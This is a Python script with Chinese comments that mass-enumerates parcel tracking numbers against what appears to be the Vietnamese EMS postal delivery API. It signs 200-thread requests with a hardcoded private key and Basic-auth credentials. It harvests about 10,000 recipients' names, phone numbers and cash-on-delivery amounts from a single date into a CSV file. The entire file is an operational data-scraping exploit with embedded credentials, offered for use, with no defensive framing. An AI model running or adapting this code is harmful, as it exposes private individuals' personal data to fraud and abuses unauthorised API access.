#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
超大范围扫描 - 目标10000订单
策略：海量扫描，200线程，全号段覆盖
"""
import hashlib, requests, json, time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TARGET_DATE = "15/10/2025"
print_lock = threading.Lock()
state = {'found': 0, 'tested': 0, 'lock': threading.Lock(), 'start_time': time.time()}
TARGET = 10000

csv_file = f"ultra_orders_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
csv_lock = threading.Lock()

def init_csv():
    with open(csv_file, 'w', encoding='utf-8-sig') as f:
        f.write('运单号,发件日期,装载日期,配送日期,收件人,收件电话,COD金额,状态,是否已配送,发现时间\n')

def save_order(tracking, issue, load, delivery, receiver, phone, cod, status, is_delivered):
    with csv_lock:
        try:
            with open(csv_file, 'a', encoding='utf-8-sig') as f:
                f.write(f'{tracking},{issue},{load},{delivery},{receiver},{phone},{cod},{status},{is_delivered},{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
                f.flush()
        except:
            pass

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    if not date_str:
        return False
    return ("15/10/2025" in str(date_str) or "10/15/2025" in str(date_str))

def check_order(tracking):
    if state['found'] >= TARGET:
        return None
    
    try:
        with state['lock']:
            state['tested'] += 1
        
        sig = sign(tracking)
        headers = {
            "Authorization": f"Basic {BASIC_AUTH}",
            "APIKey": PRIVATE_KEY,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        r = requests.post(
            f"{API_URL}api/Delivery/Inquiry",
            headers=headers,
            data={"ParcelCode": tracking, "Signature": sig},
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            if data.get('Code') == '00' and data.get('Value'):
                v = data['Value']
                issue = v.get('IssueDate', '')
                load = v.get('LoadDate', '')
                
                if is_today(issue) or is_today(load):
                    with state['lock']:
                        state['found'] += 1
                        count = state['found']
                    
                    delivery = v.get('DeliveryDate', '')
                    receiver = v.get('ReceiverName', '')[:20]
                    phone = v.get('ReceiverPhone', '')
                    cod = v.get('CollectAmount', 0)
                    status = v.get('StatusName', '')
                    is_delivered = "已配送" if delivery else "未配送"
                    
                    elapsed = time.time() - state['start_time']
                    speed = state['tested'] / elapsed if elapsed > 0 else 0
                    
                    safe_print(f"✅ [{count}/{TARGET}] {tracking} | {is_delivered} | {receiver} | {cod:,}₫ | {speed:.0f}/s")
                    save_order(tracking, issue, load, delivery, receiver, phone, cod, status, is_delivered)
                    return True
    except:
        pass
    return False

# 🔥 超大扫描范围 - 所有EP/EF系列
RANGES = [
    # EP全范围 - 480M到500M，步长1
    ('EP', 480000000, 500000000, 1),   # 2000万号！
    
    # EF全范围 - 30M到55M，步长1  
    ('EF', 30000000, 55000000, 1),      # 2500万号！
    
    # 其他可能的系列
    ('ED', 30000000, 50000000, 5),      # 400万点
    ('EB', 30000000, 50000000, 5),      # 400万点
    ('EC', 30000000, 50000000, 5),      # 400万点
]

print(f"""
╔═══════════════════════════════════════════════════════════╗
║     🔥 超大范围扫描 - 目标{TARGET:,}个订单         ║
╚═══════════════════════════════════════════════════════════╝

📊 扫描范围（超大）:
  EP: 480M-500M (2000万号)
  EF: 30M-55M (2500万号)
  ED/EB/EC: 30M-50M (1200万点)
  
  总计: 约4700万号段！

⚡ 配置:
  线程: 200
  超时: 5秒
  目标: {TARGET:,}订单
  日期: {TARGET_DATE}

🚀 开始海量扫描...
""")

init_csv()
start_time = time.time()

with ThreadPoolExecutor(max_workers=200) as executor:
    futures = []
    
    for prefix, start, end, step in RANGES:
        if state['found'] >= TARGET:
            break
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            if state['tested'] % 1000 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                progress = (state['found'] / TARGET * 100)
                eta_hours = (TARGET - state['found']) / (state['found'] / (elapsed/3600)) if state['found'] > 0 else 0
                safe_print(f"📊 已扫{state['tested']:,} | 找到{state['found']:,} ({progress:.1f}%) | {speed:.0f}/s | 预计{eta_hours:.1f}小时")
        except:
            pass

elapsed = time.time() - start_time
print(f"""
\n{'='*70}
🎉 扫描完成！
找到: {state['found']:,} 个订单
测试: {state['tested']:,} 个号
耗时: {elapsed/3600:.1f} 小时
速度: {state['tested']/elapsed:.0f} 次/秒
文件: {csv_file}
{'='*70}
""")
